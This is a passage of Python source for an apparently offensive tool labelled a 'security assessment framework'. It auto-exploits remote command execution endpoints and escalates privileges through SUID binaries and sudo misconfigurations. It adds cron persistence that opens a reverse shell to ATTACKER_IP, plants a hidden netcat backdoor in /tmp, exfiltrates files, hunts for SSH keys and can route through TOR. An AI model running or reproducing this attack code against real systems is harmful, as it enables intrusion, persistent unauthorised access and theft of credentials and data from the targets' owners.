        ]
        
        for endpoint in endpoints:
            url = f"http://{self.target}:{self.port}{endpoint}"
            try:
                response = self.session.get(url, timeout=2, verify=False)
                if response.status_code == 200:
                    print(f"{Colors.GREEN}[!] Accessible RCE endpoint found: {endpoint}{Colors.END}")
                    self.found_rce_endpoints.append(endpoint)
                    
                    # IMMEDIATELY TEST EXPLOITATION
                    print(f"{Colors.CYAN}[>] Immediately testing exploitation: {endpoint}{Colors.END}")
                    test_result = self.rce_exploiter.exploit_found_endpoint(endpoint, "whoami")
                    if "Command execution failed" not in test_result:
                        print(f"{Colors.GREEN}[+] SUCCESSFUL RCE via {endpoint}: {test_result}{Colors.END}")
                        return True
                        
            except Exception as e:
                continue
        
        return len(self.found_rce_endpoints) > 0

# =============================================================================
# EXISTING CLASSES (Keep as is)
# =============================================================================

class NetworkExploiter:
    """Enhanced network service exploitation"""
    
    def __init__(self, target: str):
        self.target = target
        
    def comprehensive_scan(self):
        """Comprehensive network scan"""
        print(f"{Colors.CYAN}[>] Performing comprehensive network scan...{Colors.END}")
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
        
        open_ports = NetworkScanner.quick_port_scan(self.target, common_ports)
        
        for port, is_open in open_ports.items():
            if is_open:
                service = NetworkScanner.enhanced_service_detection(self.target, port)
                print(f"{Colors.GREEN}[+] Port {port} open - {service}{Colors.END}")
        
        return len([p for p in open_ports.values() if p]) > 0

class PrivilegeEscalation:
    """Real privilege escalation techniques"""
    
    def __init__(self, shell_manager: RealShellManager):
        self.shell_manager = shell_manager
        
    def attempt_escalation(self):
        """Attempt various privilege escalation methods"""
        print(f"{Colors.CYAN}[>] Attempting privilege escalation...{Colors.END}")
        
        methods = [
            self._check_suid_binaries,
            self._check_sudo_permissions,
            self._check_cron_jobs,
            self._check_capabilities,
            self._check_writable_files,
            self._exploit_suid_binaries,
            self._exploit_sudo_misconfig
        ]
        
        for method in methods:
            if method():
                return True
        
        return False
    
    def _check_suid_binaries(self):
        """Check for exploitable SUID binaries"""
        print(f"{Colors.CYAN}[>] Checking SUID binaries...{Colors.END}")
        
        result = self.shell_manager.execute_real_command("find / -perm -4000 -type f 2>/dev/null | head -20")
        if result and "Command execution failed" not in result:
            exploitable_binaries = ['/bin/bash', '/bin/dash', '/usr/bin/find', '/usr/bin/nmap', '/usr/bin/vim']
            
            for binary in exploitable_binaries:
                if binary in result:
                    print(f"{Colors.GREEN}[+] Exploitable SUID binary found: {binary}{Colors.END}")
                    return True
            
            return False
        return False
    
    def _check_sudo_permissions(self):
        """Check sudo permissions"""
        print(f"{Colors.CYAN}[>] Checking sudo permissions...{Colors.END}")
        
        result = self.shell_manager.execute_real_command("sudo -l 2>/dev/null")
        if result and "not allowed" not in result and "Command execution failed" not in result:
            print(f"{Colors.YELLOW}[!] Sudo permissions found:{Colors.END}")
            print(result)
            return True
        return False
    
    def _check_cron_jobs(self):
        """Check for exploitable cron jobs"""
        result = self.shell_manager.execute_real_command("ls -la /etc/cron* /var/spool/cron 2>/dev/null")
        if result and "Command execution failed" not in result:
            print(f"{Colors.YELLOW}[!] Cron jobs found{Colors.END}")
            return True
        return False
    
    def _check_capabilities(self):
        """Check Linux capabilities"""
        result = self.shell_manager.execute_real_command("getcap -r / 2>/dev/null")
        if result and "Command execution failed" not in result and result.strip():
            print(f"{Colors.YELLOW}[!] Capabilities found:{Colors.END}")
            print(result)
            return True
        return False
    
    def _check_writable_files(self):
        """Check writable system files"""
        result = self.shell_manager.execute_real_command("find /etc -writable 2>/dev/null | head -10")
        if result and "Command execution failed" not in result and result.strip():
            print(f"{Colors.YELLOW}[!] Writable system files:{Colors.END}")
            print(result)
            return True
        return False

    def _exploit_suid_binaries(self) -> bool:
        """Actually exploit misconfigured SUID binaries"""
        print(f"{Colors.CYAN}[>] Exploiting SUID binaries...{Colors.END}")
        
        suid_find_command = "find / -perm -4000 -type f 2>/dev/null"
        suid_binaries_result = self.shell_manager.execute_real_command(suid_find_command)
        
        if not suid_binaries_result or "Command execution failed" in suid_binaries_result:
            return False
        
        exploitable_binaries = {
            '/bin/bash': ['bash -p', 'bash -c "bash -p"'],
            '/bin/dash': ['dash -p', 'dash -c "dash -p"'],
            '/usr/bin/find': ['find . -exec /bin/sh \\; -quit', 'find / -exec /bin/sh \\; -quit'],
            '/usr/bin/nmap': ['nmap --interactive', 'nmap -i'],
            '/usr/bin/vim': ['vim -c ":!bash"'],
            '/usr/bin/less': ['less /etc/passwd', '!/bin/sh'],
            '/usr/bin/more': ['more /etc/passwd', '!/bin/sh'],
            '/usr/bin/awk': ['awk "BEGIN {system(\"/bin/sh\")}"'],
            '/usr/bin/man': ['man man', '!/bin/sh'],
            '/usr/bin/sudo': ['sudo bash']
        }
        
        for binary, exploits in exploitable_binaries.items():
            if binary in suid_binaries_result:
                print(f"{Colors.GREEN}[+] Attempting to exploit {binary}{Colors.END}")
                
                for exploit in exploits:
                    result = self.shell_manager.execute_real_command(exploit)
                    if result and "root" in result.lower():
                        print(f"{Colors.GREEN}[+] SUCCESS! Root access obtained via {binary}{Colors.END}")
                        return True
        
        return False

    def _exploit_sudo_misconfig(self) -> bool:
        """Actually exploit sudo misconfigurations"""
        print(f"{Colors.CYAN}[>] Exploiting sudo misconfigurations...{Colors.END}")
        
        sudo_l_result = self.shell_manager.execute_real_command("sudo -l 2>/dev/null")
        
        if not sudo_l_result or "not allowed" in sudo_l_result or "Command execution failed" in sudo_l_result:
            return False
        
        # Check for common exploitable patterns
        exploitable_patterns = {
            'ALL': 'sudo bash',
            'NOPASSWD': 'sudo -i',
            '/bin/bash': 'sudo /bin/bash',
            '/bin/sh': 'sudo /bin/sh',
            'find': 'sudo find / -exec /bin/sh \\;',
            'awk': 'sudo awk "BEGIN {system(\"/bin/sh\")}"',
            'perl': 'sudo perl -e "exec \'/bin/sh\'"',
            'python': 'sudo python -c "import os; os.system(\'/bin/sh\')"',
            'vim': 'sudo vim -c ":!bash"',
            'less': 'sudo less /etc/passwd',
            'more': 'sudo more /etc/passwd'
        }
        
        for pattern, exploit in exploitable_patterns.items():
            if pattern in sudo_l_result:
                print(f"{Colors.GREEN}[+] Exploiting sudo pattern: {pattern}{Colors.END}")
                result = self.shell_manager.execute_real_command(exploit)
                if result and "root" in result.lower():
                    print(f"{Colors.GREEN}[+] SUDO EXPLOIT SUCCESS! Root access obtained{Colors.END}")
                    return True
        
        return False

# =============================================================================
# ENHANCED: ComprehensiveScanner with Intelligent Exploitation
# =============================================================================

class ComprehensiveScanner:
    """ENHANCED main scanner with intelligent exploitation"""
    
    def __init__(self):
        self.banner()
        self.report_data = {
            'scan_start_time': datetime.now().isoformat(),
            'target': '',
            'findings': [],
            'exploitation_attempts': []
        }
        self.tor_manager = TorManager()
        
    def banner(self):
        print(f"""{Colors.CYAN}
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
                                                                                                                          
     Cerberus Security Assessment Framework v5.1 - Enhanced
           by: ek0ms savi0r
{Colors.END}""")

    def run_comprehensive_assessment(self):
        """ENHANCED comprehensive security assessment with intelligent exploitation"""
        print(f"\n{Colors.GREEN}[+] Cerberus Security Assessment Framework v5.1{Colors.END}")
        print(f"{Colors.YELLOW}[*] Enhanced with Intelligent RCE Exploitation{Colors.END}")
        print(f"{Colors.YELLOW}[*] Interactive Mode - No command line arguments needed{Colors.END}")
        
        # Get target information
        target = input(f"{Colors.BLUE}[?] Enter target IP/hostname: {Colors.END}").strip()
        if not target:
            print(f"{Colors.RED}[-] Target is required{Colors.END}")
            return
        
        try:
            port_input = input(f"{Colors.BLUE}[?] Enter target port (default 80): {Colors.END}").strip()
            port = int(port_input) if port_input else 80
        except ValueError:
            port = 80
        
        # TOR option
        use_tor = input(f"{Colors.BLUE}[?] Use TOR proxy? (y/n): {Colors.END}").lower().strip() == 'y'
        if use_tor:
            if self.tor_manager.enable_tor():
                print(f"{Colors.GREEN}[+] TOR proxy enabled{Colors.END}")
            else:
                print(f"{Colors.RED}[-] TOR setup failed, continuing without TOR{Colors.END}")
        
        # Scan type
        print(f"\n{Colors.PURPLE}[ SCAN OPTIONS ]{Colors.END}")
        print(f"{Colors.YELLOW}1. Quick Scan (Network + Web){Colors.END}")
        print(f"{Colors.YELLOW}2. Full Assessment (Network + Web + Exploitation){Colors.END}")
        print(f"{Colors.YELLOW}3. Network Scan Only{Colors.END}")
        print(f"{Colors.YELLOW}4. Web Scan Only{Colors.END}")
        
        scan_type = input(f"{Colors.BLUE}[?] Select scan type (1-4): {Colors.END}").strip()
        
        auto_exploit = False
        if scan_type == '2':
            auto_exploit = input(f"{Colors.BLUE}[?] Enable auto-exploit? (y/n): {Colors.END}").lower() == 'y'
        
        print(f"\n{Colors.GREEN}[+] Starting assessment for {target}:{port}{Colors.END}")
        
        self.report_data['target'] = f"{target}:{port}"
        
        # Store open ports for service-specific exploitation
        open_ports_info = []
        
        # Network scanning for all types except web-only
        if scan_type in ['1', '2', '3']:
            print(f"\n{Colors.PURPLE}[ PHASE 1: Network Reconnaissance ]{Colors.END}")
            network_exploiter = NetworkExploiter(target)
            network_exploiter.comprehensive_scan()
            
            # NEW: Service-specific exploitation
            print(f"\n{Colors.PURPLE}[ PHASE 1.5: Service-Specific Exploitation ]{Colors.END}")
            service_exploiter = ServiceSpecificExploiter(target)
            
            # Common ports to check for service exploitation
            service_ports = [21, 22, 23, 53, 80, 443, 445, 3389]
            for port_num in service_ports:
                if NetworkScanner.port_scan(target, port_num):
                    service = NetworkScanner.enhanced_service_detection(target, port_num)
                    service_exploiter.exploit_service(port_num, service)
        
        # Web vulnerability scanning for all types except network-only
        if scan_type in ['1', '2', '4']:
            print(f"\n{Colors.PURPLE}[ PHASE 2: Enhanced Web Application Scanning ]{Colors.END}")
            web_scanner = WebVulnerabilityScanner(target, port)
            
            # Use threading with timeouts for web scanning
            with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                sql_future = executor.submit(web_scanner.scan_sql_injection)
                xss_future = executor.submit(web_scanner.scan_xss)
                rce_future = executor.submit(web_scanner.scan_rce_endpoints)
                
                try:
                    if sql_future.result(timeout=10):
                        self._add_finding('SQL Injection', 'HIGH', 'SQL injection vulnerability detected')
                except concurrent.futures.TimeoutError:
                    print(f"{Colors.YELLOW}[!] SQL injection scan timed out{Colors.END}")
                
                try:
                    if xss_future.result(timeout=10):
                        self._add_finding('XSS', 'MEDIUM', 'Cross-site scripting vulnerability detected')
                except concurrent.futures.TimeoutError:
                    print(f"{Colors.YELLOW}[!] XSS scan timed out{Colors.END}")
                
                try:
                    rce_result = rce_future.result(timeout=15)
                    if rce_result:
                        self._add_finding('RCE Endpoint', 'CRITICAL', 'Potential RCE endpoint found')
                        # Store found endpoints for later exploitation
                        found_endpoints = web_scanner.found_rce_endpoints
                        if found_endpoints:
                            print(f"{Colors.GREEN}[+] RCE endpoints identified: {found_endpoints}{Colors.END}")
                except concurrent.futures.TimeoutError:
                    print(f"{Colors.YELLOW}[!] RCE endpoint scan timed out{Colors.END}")
        
        # Command execution and exploitation for full assessment
        if scan_type == '2':
            print(f"\n{Colors.PURPLE}[ PHASE 3: Intelligent Command Execution ]{Colors.END}")
            
            # Use found RCE endpoints for enhanced exploitation
            found_endpoints = getattr(web_scanner, 'found_rce_endpoints', []) if 'web_scanner' in locals() else []
            shell_manager = RealShellManager(target, port, self, found_endpoints)
            
            if shell_manager.test_command_execution():
                self._add_finding('Command Execution', 'CRITICAL', 'Remote command execution achieved')
                
                # Step 4: Privilege escalation
                print(f"\n{Colors.PURPLE}[ PHASE 4: Privilege Escalation ]{Colors.END}")
                priv_escalation = PrivilegeEscalation(shell_manager)
                
                if priv_escalation.attempt_escalation():
                    self._add_finding('Privilege Escalation', 'CRITICAL', 'Successfully escalated privileges')
                    
                    # Step 5: Persistence
                    print(f"\n{Colors.PURPLE}[ PHASE 5: Persistence ]{Colors.END}")
                    self._establish_persistence(shell_manager)
                
                # Step 6: Post-exploitation
                if auto_exploit or input(f"{Colors.BLUE}[?] Start post-exploitation? (y/n): {Colors.END}").lower() == 'y':
                    self._post_exploitation_menu(shell_manager)
        
        # Generate report
        self._generate_report()
        
        # Disable TOR if it was enabled
        if use_tor:
            self.tor_manager.disable_tor()
        
        print(f"\n{Colors.GREEN}[+] Assessment complete!{Colors.END}")

    # =========================================================================
    # EXISTING METHODS (Keep as is)
    # =========================================================================

    def _establish_persistence(self, shell_manager: RealShellManager):
        """Establish persistence mechanisms"""
        print(f"{Colors.CYAN}[>] Establishing persistence...{Colors.END}")
        
        # Add cron job
        try:
            cron_cmd = "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
            result = shell_manager.execute_real_command(f'(crontab -l ; echo "{cron_cmd}") | crontab -')
            if "Command execution failed" not in result:
                print(f"{Colors.GREEN}[+] Cron job persistence added{Colors.END}")
        except:
            pass
        
        # Create backdoor
        try:
            backdoor_cmd = "echo '#!/bin/bash\nwhile true; do nc -lvp 1337 -e /bin/bash; done' > /tmp/.backdoor && chmod +x /tmp/.backdoor"
            result = shell_manager.execute_real_command(backdoor_cmd)
            if "Command execution failed" not in result:
                print(f"{Colors.GREEN}[+] Backdoor created at /tmp/.backdoor{Colors.END}")
        except:
            pass

    def _add_finding(self, finding_type: str, severity: str, details: str):
        """Helper to add findings"""
        self.report_data['findings'].append({
            'type': finding_type,
            'severity': severity,
            'details': details,
            'timestamp': datetime.now().isoformat()
        })

    def _post_exploitation_menu(self, shell_manager: RealShellManager):
        """Post-exploitation options"""
        while True:
            print(f"\n{Colors.PURPLE}{'='*60}{Colors.END}")
            print(f"{Colors.PURPLE}[ POST-EXPLOITATION MENU ]{Colors.END}")
            print(f"{Colors.PURPLE}{'='*60}{Colors.END}")
            print(f"{Colors.CYAN}[1]{Colors.END} Interactive Shell")
            print(f"{Colors.CYAN}[2]{Colors.END} Data Exfiltration") 
            print(f"{Colors.CYAN}[3]{Colors.END} System Information")
            print(f"{Colors.CYAN}[4]{Colors.END} Network Reconnaissance")
            print(f"{Colors.CYAN}[5]{Colors.END} Lateral Movement")
            print(f"{Colors.CYAN}[6]{Colors.END} Persistence")
            print(f"{Colors.CYAN}[7]{Colors.END} Return to Main")
            print(f"{Colors.PURPLE}{'='*60}{Colors.END}")
            
            choice = input(f"{Colors.BLUE}[?] Select option: {Colors.END}").strip()
            
            if choice == '1':
                shell_manager.interactive_shell()
            elif choice == '2':
                self._data_exfiltration(shell_manager)
            elif choice == '3':
                self._system_info(shell_manager)
            elif choice == '4':
                self._network_recon(shell_manager)
            elif choice == '5':
                self._lateral_movement(shell_manager)
            elif choice == '6':
                self._establish_persistence(shell_manager)
            elif choice == '7':
                break
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.END}")

    def _data_exfiltration(self, shell_manager: RealShellManager):
        """Exfiltrate sensitive data"""
        print(f"{Colors.CYAN}[>] Exfiltrating sensitive data...{Colors.END}")
        
        data = shell_manager.extract_real_data()
        
        if data:
            # Save to file
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"exfiltrated_data_{shell_manager.target}_{timestamp}.txt"
            
            with open(filename, 'w') as f:
                f.write("EXFILTRATED DATA REPORT\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Target: {shell_manager.target}:{shell_manager.port}\n")
                f.write(f"Time: {datetime.now().isoformat()}\n\n")
                
                for file_path, content in data.items():
                    f.write(f"FILE: {file_path}\n")
                    f.write("-" * 40 + "\n")
                    f.write(content)
                    f.write("\n\n")
            
            print(f"{Colors.GREEN}[+] Data saved to: {filename}{Colors.END}")
        else:
            print(f"{Colors.RED}[-] No data could be extracted{Colors.END}")

    def _system_info(self, shell_manager: RealShellManager):
        """Gather system information"""
        print(f"{Colors.CYAN}[>] Gathering system information...{Colors.END}")
        
        commands = {
            "Kernel Info": "uname -a",
            "CPU Info": "cat /proc/cpuinfo | grep 'model name' | head -1",
            "Memory Info": "free -h",
            "Disk Usage": "df -h",
            "Current User": "whoami && id",
            "Processes": "ps aux | head -20"
        }
        
        for desc, cmd in commands.items():
            result = shell_manager.execute_real_command(cmd)
            if result and "Command execution failed" not in result:
                print(f"{Colors.YELLOW}[{desc}]{Colors.END} {result.strip()}")

    def _network_recon(self, shell_manager: RealShellManager):
        """Internal network reconnaissance"""
        print(f"{Colors.CYAN}[>] Performing internal network reconnaissance...{Colors.END}")
        
        commands = {
            "Network Interfaces": "ifconfig || ip addr",
            "Routing Table": "route -n || ip route",
            "ARP Table": "arp -a || ip neigh",
            "Active Connections": "netstat -tulpn || ss -tulpn"
        }
        
        for desc, cmd in commands.items():
            result = shell_manager.execute_real_command(cmd)
            if result and "Command execution failed" not in result:
                print(f"{Colors.YELLOW}[{desc}]{Colors.END}")
                print(result)

    def _lateral_movement(self, shell_manager: RealShellManager):
        """Lateral movement techniques"""
        print(f"{Colors.CYAN}[>] Attempting lateral movement...{Colors.END}")
        
        # Check for SSH keys
        result = shell_manager.execute_real_command("find /home /root -name '.ssh' -type d 2>/dev/null")
        if result and "Command execution failed" not in result:
            print(f"{Colors.YELLOW}[!] SSH directories found:{Colors.END}")
            print(result)
        
        # Check for password files
        result = shell_manager.execute_real_command("find / -name '*.pem' -o -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null | head -10")
        if result and "Command execution failed" not in result:
            print(f"{Colors.YELLOW}[!] Potential key files found:{Colors.END}")
            print(result)

    def _generate_report(self):
        """Generate final report"""
        print(f"\n{Colors.CYAN}[>] Generating assessment report...{Colors.END}")
        
        self.report_data['scan_end_time'] = datetime.now().isoformat()
        
        filename = f"cerberus_assessment_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(filename, 'w') as f:
            f.write("CERBERUS SECURITY ASSESSMENT REPORT\n")
            f.write("=" * 60 + "\n\n")
            
            f.write(f"Scan Date: {self.report_data['scan_start_time']}\n")
            f.write(f"Target: {self.report_data['target']}\n")
            f.write(f"Report Generated: {self.report_data['scan_end_time']}\n\n")
            
            f.write("FINDINGS SUMMARY:\n")
            f.write("-" * 20 + "\n")
            
            for finding in self.report_data['findings']:
                f.write(f"Type: {finding['type']}\n")
                f.write(f"Severity: {finding['severity']}\n")
                f.write(f"Details: {finding['details']}\n")
                f.write(f"Time: {finding['timestamp']}\n\n")
        
        print(f"{Colors.GREEN}[+] Report saved to: {filename}{Colors.END}")

def main():
    scanner = ComprehensiveScanner()
    
    try:
        scanner.run_comprehensive_assessment()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Assessment interrupted by user{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {str(e)}{Colors.END}")

if __name__ == "__main__":
    main()
